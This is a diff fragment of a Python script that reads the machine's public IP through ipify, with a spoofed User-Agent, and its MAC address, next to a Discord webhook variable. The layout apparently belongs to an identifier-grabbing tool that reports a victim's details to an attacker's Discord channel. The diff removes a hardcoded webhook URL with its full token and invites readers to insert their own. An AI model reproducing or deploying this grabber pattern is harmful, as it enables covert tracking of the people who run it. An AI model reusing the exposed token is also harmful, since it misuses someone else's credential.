@@ -8,7 +8,7 @@ import getmac
 import random
 import json
 
-wh_url = "https://discord.com/api/webhooks/1002749565662924852/YGnW8SZno4rti0ZzrPcP7thz03AgorJN1vzwDDsGvziX0Zcshz_ceoIcxuO_d9TvUYT-"
+wh_url = "" #put your WebHock Bot From Discord
 ip = requests.get("https://api.ipify.org", headers={'User-Agent':'google.com'})
 mac = getmac.get_mac_address()
 
